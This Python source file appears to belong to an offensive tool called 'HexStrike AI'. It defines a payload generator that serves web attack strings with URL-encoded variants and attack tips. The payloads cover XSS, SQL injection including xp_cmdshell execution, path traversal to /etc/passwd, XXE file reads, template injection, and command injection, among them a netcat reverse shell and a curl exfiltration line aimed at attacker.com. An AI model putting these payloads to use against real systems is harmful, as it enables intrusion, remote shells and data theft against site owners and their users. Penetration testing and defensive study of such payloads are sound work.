"""
HexStrike AI - AI Payload Generator
"""
import logging
from typing import Dict, Any, List

logger = logging.getLogger(__name__)


class AIPayloadGenerator:
    """AI-powered payload generation with contextual intelligence."""

    def __init__(self):
        self.payload_templates = {
            "xss": {
                "basic": [
                    "<script>alert('XSS')</script>",
                    "javascript:alert('XSS')",
                    "'><script>alert('XSS')</script>",
                ],
                "advanced": [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "<body onload=alert('XSS')>",
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<svg/onload=alert('XSS')>",
                    "<details ontoggle=alert('XSS')>",
                ],
            },
            "sqli": {
                "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--"],
                "advanced": [
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "'; EXEC xp_cmdshell('whoami')--",
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                ],
            },
            "lfi": {
                "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "advanced": [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "/proc/self/environ",
                    "/etc/passwd%00",
                ],
            },
            "cmd_injection": {
                "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
                "advanced": [
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                ],
            },
            "xxe": {
                "basic": [
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                ],
            },
            "ssti": {
                "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
                "advanced": [
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                ],
            },
        }

    def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        attack_type = target_info.get("attack_type", "xss")
        complexity = target_info.get("complexity", "basic")
        target_tech = target_info.get("technology", "").lower()

        payloads = self._get_payloads(attack_type, complexity)
        enhanced = self._enhance_with_context(payloads, target_tech)
        test_cases = self._generate_test_cases(enhanced, attack_type)

        return {
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": len(enhanced),
            "payloads": enhanced,
            "test_cases": test_cases,
            "recommendations": self._get_recommendations(attack_type),
        }

    def _get_payloads(self, attack_type: str, complexity: str) -> list:
        if attack_type in self.payload_templates:
            if complexity in self.payload_templates[attack_type]:
                return self.payload_templates[attack_type][complexity]
            return self.payload_templates[attack_type].get("basic", [])
        return []

    def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
        enhanced = []
        for payload in payloads:
            enhanced.append({
                "payload": payload,
                "context": "basic",
                "encoding": "none",
                "risk_level": self._assess_risk_level(payload),
            })
            url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
            enhanced.append({
                "payload": url_encoded,
                "context": "url_encoded",
                "encoding": "url",
                "risk_level": self._assess_risk_level(payload),
            })
        return enhanced

    def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
        test_cases = []
        for i, p in enumerate(payloads[:5]):
            test_cases.append({
                "id": f"test_{i + 1}",
                "payload": p["payload"],
                "method": "GET" if len(p["payload"]) < 100 else "POST",
                "expected_behavior": self._get_expected_behavior(attack_type),
                "risk_level": p["risk_level"],
            })
        return test_cases

    def _get_expected_behavior(self, attack_type: str) -> str:
        behaviors = {
            "xss": "JavaScript execution or popup alert",
            "sqli": "Database error or data extraction",
            "lfi": "File content disclosure",
            "cmd_injection": "Command execution on server",
            "ssti": "Template expression evaluation",
            "xxe": "XML external entity processing",
        }
        return behaviors.get(attack_type, "Unexpected application behavior")

    def _assess_risk_level(self, payload: str) -> str:
        high_risk = ["system", "exec", "eval", "cmd", "shell", "passwd"]
        medium_risk = ["script", "alert", "union", "select"]
        pl = payload.lower()
        if any(i in pl for i in high_risk):
            return "HIGH"
        if any(i in pl for i in medium_risk):
            return "MEDIUM"
        return "LOW"

    def _get_recommendations(self, attack_type: str) -> list:
        recs = {
            "xss": ["Test in different input fields", "Try reflected and stored XSS"],
            "sqli": ["Test different injection techniques", "Try error-based and blind"],
            "lfi": ["Test various traversal depths", "Try different encodings"],
            "cmd_injection": ["Test different separators", "Try direct and blind injection"],
        }
        return recs.get(attack_type, ["Test thoroughly", "Monitor responses"])


# Global instance
ai_payload_generator = AIPayloadGenerator()